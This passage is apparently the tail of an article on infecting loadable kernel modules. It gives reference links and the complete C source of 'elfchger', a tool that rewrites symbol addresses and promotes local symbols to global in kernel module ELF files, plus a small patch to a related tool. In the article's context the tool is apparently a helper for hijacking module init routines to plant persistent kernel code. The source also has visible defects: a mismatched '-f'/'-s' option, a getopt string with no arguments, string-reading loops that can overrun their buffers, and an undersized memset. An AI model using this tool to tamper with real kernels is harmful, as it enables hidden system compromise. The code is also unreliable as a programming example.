+    http://www.muppetlabs.com/~breadbox/software/ELF.txt
+
+[3] Init Call Mechanism in the Linux Kernel
+    http://linuxgazette.net/157/amurray.html
+
+[4] Understanding the Linux Kernel, 3rd Edition
+
+[5] Init Call Mechanism in the Linux Kernel
+    http://linuxgazette.net/157/amurray.html
+
+[6] OpenBSD Loadable Kernel Modules
+    http://www.thc.org/root/docs/loadable_kernel_modules/openbsd-lkm.html
+
+[7] Introduction to NetBSD loadable kernel modules
+    http://www.home.unix-ag.org/bmeurer/NetBSD/howto-lkm.html
+
+[8] Solaris Loadable Kernel Modules
+    http://www.thc.org/papers/slkm-1.0.html
+
+[9] Initrd, modules, and tools
+    http://www.dark.ca/2009/06/10/initrd-modules-and-tools/
+
+
+---[ 9 - Codes
+
+
+---[ 9.1 - Elfchger
+
+
+/*
+ * elfchger.c by styx^ <the.styx@gmail.com> (based on truff's code)
+ *
+ * Script with two features:
+ *
+ * Usage 1: Change the symbol name value (address) in a kernel module.
+ * Usage 2: Change the symbol binding (from local to global) in a kernel
+ *          module.
+ *
+ * Usage:
+ * 1: ./elfchger -f [symbol] -v [value] <module_name>
+ * 2: ./elfchger -g [symbol] <module_name>
+ */
+
+#include <stdlib.h>
+#include <stdio.h>
+#include <elf.h>
+#include <string.h>
+#include <getopt.h>
+
+int ElfGetSectionByName (FILE *fd, Elf32_Ehdr *ehdr, char *section,
+                         Elf32_Shdr *shdr);
+
+int ElfGetSectionName (FILE *fd, Elf32_Word sh_name,
+                       Elf32_Shdr *shstrtable, char *res, size_t len);
+
+Elf32_Off ElfGetSymbolByName (FILE *fd, Elf32_Shdr *symtab,
+                       Elf32_Shdr *strtab, char *name, Elf32_Sym *sym);
+
+void ElfGetSymbolName (FILE *fd, Elf32_Word sym_name,
+                       Elf32_Shdr *strtable, char *res, size_t len);
+
+unsigned long ReorderSymbols (FILE *fd, Elf32_Shdr *symtab,
+                       Elf32_Shdr *strtab, char *name);
+
+int ReoderRelocation(FILE *fd, Elf32_Shdr *symtab,
+                       Elf32_Shdr *strtab, char *name, Elf32_Sym *sym);
+
+int ElfGetSectionByIndex (FILE *fd, Elf32_Ehdr *ehdr, Elf32_Half index,
+                          Elf32_Shdr *shdr);
+
+void usage(char *cmd);
+
+int main (int argc, char **argv) {
+
+  FILE *fd;
+  Elf32_Ehdr hdr;
+  Elf32_Shdr symtab, strtab;
+  Elf32_Sym sym;
+  Elf32_Off symoffset;
+  Elf32_Addr value;
+
+  unsigned long new_index = 0;
+  int gflag = 0, vflag = 0, fflag = 0;
+  char *sym_name;
+  int sym_value = 0;
+
+  long sym_off, str_off;
+  int opt;
+
+  if ( argc != 4 && argc != 6 ) {
+    usage(argv[0]);
+    exit(-1);
+  }
+
+  while ((opt = getopt(argc, argv, "vsg")) != -1) {
+
+    switch (opt) {
+
+      case 'g':
+
+        if( argc-1 < optind) {
+	    printf("[-] You must specify symbol name!\n");
+	    usage(argv[0]);
+	    exit(-1);
+        }
+
+        gflag = 1;
+        sym_name = argv[optind];
+
+        break;
+
+      case 's':
+
+        if( argc-1 < optind) {
+          printf("[-] You must specify symbol name!\n");
+          usage(argv[0]);
+          exit(-1);
+        }
+
+        fflag = 1;
+        sym_name = argv[optind];
+
+        break;
+
+      case 'v':
+
+        if( argc-1 < optind) {
+          printf("[-] You must specify new symbol address\n");
+          usage(argv[0]);
+          exit(-1);
+        }
+
+        vflag = 1;
+        sym_value = strtol(argv[optind], (char **) NULL, 16);
+
+        break;
+
+      default:
+        usage(argv[0]);
+        exit(-1);
+    }
+  }
+
+  printf("[+] Opening %s file...\n", argv[argc-1]);
+
+  fd = fopen (argv[argc-1], "r+");
+
+  if (fd == NULL) {
+
+    printf("[-] File \"%s\" not found!\n", argv[1]);
+    exit(-1);
+  }
+
+  printf("[+] Reading Elf header...\n");
+
+  if (fread (&hdr, sizeof (Elf32_Ehdr), 1, fd) < 1) {
+
+    printf("[-] Elf header corrupted!\n");
+    exit(-1);
+  }
+
+  printf("\t>> Done!\n");
+
+  printf("[+] Finding \".symtab\" section...\n");
+
+  sym_off = ElfGetSectionByName (fd, &hdr, ".symtab", &symtab);
+
+  if (sym_off == -1) {
+
+    printf("[-] Can't get .symtab section\n");
+    exit(-1);
+  }
+
+  printf("\t>> Found at 0x%x\n", (int )sym_off);
+  printf("[+] Finding \".strtab\" section...\n");
+
+  str_off = ElfGetSectionByName (fd, &hdr, ".strtab", &strtab);
+
+  if (str_off  == -1) {
+
+    printf("[-] Can't get .strtab section!\n");
+    exit(-1);
+  }
+
+  printf("\t>> Found at 0x%x\n", (int )str_off);
+
+  printf("[+] Getting symbol' infos:\n");
+
+  symoffset = ElfGetSymbolByName (fd, &symtab, &strtab, sym_name, &sym);
+
+  if ( (int) symoffset == -1) {
+
+    printf("[-] Symbol \"%s\" not found!\n", sym_name);
+    exit(-1);
+  }
+
+  if ( gflag == 1 ) {
+
+    if ( ELF32_ST_BIND(sym.st_info) == STB_LOCAL ) {
+
+      unsigned char global;
+      unsigned long offset = 0;
+
+      printf("[+] Reordering symbols:\n");
+
+      new_index = ReorderSymbols(fd, &symtab, &strtab, sym_name);
+
+      printf("[+] Updating symbol' infos:\n");
+
+      symoffset = ElfGetSymbolByName(fd, &symtab, &strtab, sym_name, &sym);
+
+      if ( (int) symoffset == -1) {
+
+        printf("[-] Symbol \"%s\" not found!\n", sym_name);
+        exit(-1);
+      }
+
+      offset = symoffset+1+sizeof(Elf32_Addr)+1+sizeof(Elf32_Word)+2;
+
+      printf("\t>> Replacing flag 'LOCAL' located at 0x%x with 'GLOBAL'\
+              \n", (unsigned int)offset);
+
+      if (fseek (fd, offset, SEEK_SET) == -1) {
+
+        perror("[-] fseek: ");
+        exit(-1);
+      }
+
+      global = ELF32_ST_INFO(STB_GLOBAL, STT_FUNC);
+
+      if (fwrite (&global, sizeof(unsigned char), 1, fd) < 1) {
+
+        perror("[-] fwrite: ");
+        exit(-1);
+      }
+
+      printf("[+] Updating symtab infos at 0x%x\n", (int )sym_off);
+
+      if ( fseek(fd, sym_off, SEEK_SET) == -1 ) {
+
+        perror("[-] fseek: ");
+        exit(-1);
+      }
+
+      symtab.sh_info = new_index; // updating sh_info with the new index
+                                  // in symbol table.
+
+      if( fwrite(&symtab, sizeof(Elf32_Shdr), 1, fd) < 1 )  {
+
+        perror("[-] fwrite: ");
+        exit(-1);
+      }
+
+    } else {
+
+      printf("[-] Already global function!\n");
+    }
+
+  } else if ( fflag == 1 && vflag == 1 ) {
+
+      memset(&value, 0, sizeof(Elf32_Addr));
+      memcpy(&value, &sym_value, sizeof(Elf32_Addr));
+
+      printf("[+] Replacing 0x%.8x with 0x%.8x... ", sym.st_value, value);
+
+      if (fseek (fd, symoffset+sizeof(Elf32_Word), SEEK_SET) == -1) {
+
+        perror("[-] fseek: ");
+        exit(-1);
+      }
+
+      if (fwrite (&value, sizeof(Elf32_Addr), 1, fd) < 1 )  {
+
+        perror("[-] fwrite: ");
+        exit(-1);
+      }
+
+      printf("done!\n");
+
+      fclose (fd);
+}
+
+return 0;
+}
+
+/* This function returns the offset relative to the symbol name "name" */
+
+Elf32_Off ElfGetSymbolByName(FILE *fd, Elf32_Shdr *symtab,
+        Elf32_Shdr *strtab, char *name, Elf32_Sym *sym) {
+
+  unsigned int i;
+  char symname[255];
+
+  for ( i = 0; i < (symtab->sh_size/symtab->sh_entsize); i++) {
+
+    if (fseek (fd, symtab->sh_offset + (i * symtab->sh_entsize),
+               SEEK_SET) == -1) {
+
+      perror("\t[-] fseek: ");
+      exit(-1);
+    }
+
+    if (fread (sym, sizeof (Elf32_Sym), 1, fd) < 1) {
+
+      perror("\t[-] read: ");
+      exit(-1);
+    }
+
+    memset (symname, 0, sizeof (symname));
+
+    ElfGetSymbolName (fd, sym->st_name, strtab, symname, sizeof (symname));
+
+    if (!strcmp (symname, name)) {
+
+      printf("\t>> Symbol found at 0x%x\n",
+                    symtab->sh_offset + (i * symtab->sh_entsize));
+
+      printf("\t>> Index in symbol table: 0x%x\n", i);
+
+      return symtab->sh_offset + (i * symtab->sh_entsize);
+    }
+  }
+
+  return -1;
+}
+
+/* This function returns the new index of symbol "name" inside the symbol
+ * table after re-ordering. */
+
+unsigned long ReorderSymbols (FILE *fd, Elf32_Shdr *symtab,
+              Elf32_Shdr *strtab, char *name) {
+
+  unsigned int i = 0, j = 0;
+  char symname[255];
+  Elf32_Sym *all;
+  Elf32_Sym temp;
+  unsigned long new_index = 0;
+  unsigned long my_off = 0;
+
+  printf("\t>> Starting:\n");
+
+  all = (Elf32_Sym *) malloc(sizeof(Elf32_Sym) *
+                      (symtab->sh_size/symtab->sh_entsize));
+
+  if ( all == NULL ) {
+
+    return -1;
+
+  }
+
+  memset(all, 0, symtab->sh_size/symtab->sh_entsize);
+
+  my_off = symtab->sh_offset;
+
+  for ( i = 0; i < (symtab->sh_size/symtab->sh_entsize); i++) {
+
+    if (fseek (fd, symtab->sh_offset + (i * symtab->sh_entsize),
+							 SEEK_SET) == -1) {
+
+      perror("\t[-] fseek: ");
+      exit(-1);
+    }
+
+    if (fread (&all[i], sizeof (Elf32_Sym), 1, fd) < 1) {
+
+      printf("\t[-] fread: ");
+      exit(-1);
+    }
+
+    memset (symname, 0, sizeof (symname));
+
+    ElfGetSymbolName(fd, all[i].st_name, strtab, symname, sizeof(symname));
+
+    if (!strcmp (symname, name)) {
+
+      j = i;
+
+      continue;
+    }
+  }
+
+  temp = all[j];
+
+  for ( i = j; i < (symtab->sh_size/symtab->sh_entsize); i++ ) {
+
+    if ( i+1 >= symtab->sh_size/symtab->sh_entsize )
+      break;
+
+    if ( ELF32_ST_BIND(all[i+1].st_info) == STB_LOCAL ) {
+
+      printf("\t>> Moving symbol from %x to %x\n", i+1, i);
+
+      all[i] = all[i+1];
+
+    } else {
+
+      new_index = i;
+
+      printf("\t>> Moving our symbol from %d to %x\n", j, i);
+
+      all[i] = temp;
+      break;
+    }
+  }
+
+  printf("\t>> Last LOCAL symbol: 0x%x\n", (unsigned int)new_index);
+
+  if ( fseek (fd, my_off, SEEK_SET) == -1 ) {
+
+      perror("\t[-] fseek: ");
+      exit(-1);
+  }
+
+  if ( fwrite(all, sizeof( Elf32_Sym), symtab->sh_size/symtab->sh_entsize,
+              fd) < (symtab->sh_size/symtab->sh_entsize )) {
+
+      perror("\t[-] fwrite: ");
+      exit(-1);
+  }
+
+  printf("\t>> Done!\n");
+
+  free(all);
+
+  return new_index;
+}
+
+
+int ElfGetSectionByIndex (FILE *fd, Elf32_Ehdr *ehdr, Elf32_Half index,
+                          Elf32_Shdr *shdr) {
+
+  if (fseek (fd, ehdr->e_shoff + (index * ehdr->e_shentsize),
+             SEEK_SET) == -1) {
+
+    perror("\t[-] fseek: ");
+    exit(-1);
+  }
+
+  if (fread (shdr, sizeof (Elf32_Shdr), 1, fd) < 1) {
+
+    printf("\t[-] Sections header corrupted");
+    exit(-1);
+  }
+
+  return 0;
+}
+
+
+int ElfGetSectionByName (FILE *fd, Elf32_Ehdr *ehdr, char *section,
+                         Elf32_Shdr *shdr) {
+
+  int i;
+  char name[255];
+  Elf32_Shdr shstrtable;
+
+  ElfGetSectionByIndex (fd, ehdr, ehdr->e_shstrndx, &shstrtable);
+
+  memset (name, 0, sizeof (name));
+
+  for ( i = 0; i < ehdr->e_shnum; i++) {
+
+    if (fseek (fd, ehdr->e_shoff + (i * ehdr->e_shentsize),
+               SEEK_SET) == -1) {
+
+      perror("\t[-] fseek: ");
+      exit(-1);
+    }
+
+    if (fread (shdr, sizeof (Elf32_Shdr), 1, fd) < 1) {
+
+      printf("[-] Sections header corrupted");
+      exit(-1);
+    }
+
+    ElfGetSectionName (fd, shdr->sh_name, &shstrtable,
+                       name, sizeof (name));
+
+    if (!strcmp (name, section)) {
+
+      return ehdr->e_shoff + (i * ehdr->e_shentsize);
+
+    }
+  }
+
+  return -1;
+}
+
+int ElfGetSectionName (FILE *fd, Elf32_Word sh_name,
+                       Elf32_Shdr *shstrtable, char *res, size_t len) {
+
+  size_t i = 0;
+
+  if (fseek (fd, shstrtable->sh_offset + sh_name, SEEK_SET) == -1) {
+
+    perror("\t[-] fseek: ");
+    exit(-1);
+  }
+
+  while ( (i < len-1) || *res != '\0' ) {
+
+    *res = fgetc (fd);
+    i++;
+    res++;
+
+  }
+
+  return 0;
+}
+
+
+void ElfGetSymbolName (FILE *fd, Elf32_Word sym_name,
+                       Elf32_Shdr *strtable, char *res, size_t len)
+{
+  size_t i = 0;
+
+  if (fseek (fd, strtable->sh_offset + sym_name, SEEK_SET) == -1) {
+
+    perror("\t[-] fseek: ");
+    exit(-1);
+  }
+
+  while ((i < len-1) || *res != '\0') {
+
+    *res = fgetc (fd);
+    i++;
+    res++;
+
+  }
+
+  return;
+}
+
+void usage(char *cmd) {
+
+  printf("Usage: %s <option(s)> <module_name>\n", cmd);
+  printf("Option(s):\n");
+  printf(" -g [symbol]\tSymbol we want to change the binding as global\n");
+  printf("Or:\n");
+  printf(" -s [symbol]\tSymbol we want to change the value (address)\n");
+  printf(" -v [value] \tNew value (address) for symbol\n");
+
+  return;
+}
+
+
+---[ 9.2 - elfstrchange.patch
+
+
+@@ -9,6 +9,7 @@
+ #include <stdlib.h>
+ #include <stdio.h>
+ #include <elf.h>
++#include <string.h>
+
+ #define FATAL(X) { perror (X);exit (EXIT_FAILURE); }
+
+@@ -160,7 +161,7 @@
+   if (fseek (fd, shstrtable->sh_offset + sh_name, SEEK_SET) == -1)
+     FATAL ("fseek");
+
+-  while ((i < len) || *res == '\0')
++  while ((i < len-1) || *res != '\0')
+   {
+     *res = fgetc (fd);
+     i++;
+@@ -179,7 +180,7 @@
+   if (fseek (fd, strtable->sh_offset + sym_name, SEEK_SET) == -1)
+     FATAL ("fseek");
+
+-  while ((i < len) || *res == '\0')
++  while ((i < len-1) || *res != '\0')
+   {
+     *res = fgetc (fd);
+     i++;
+
+
+---[ EOF
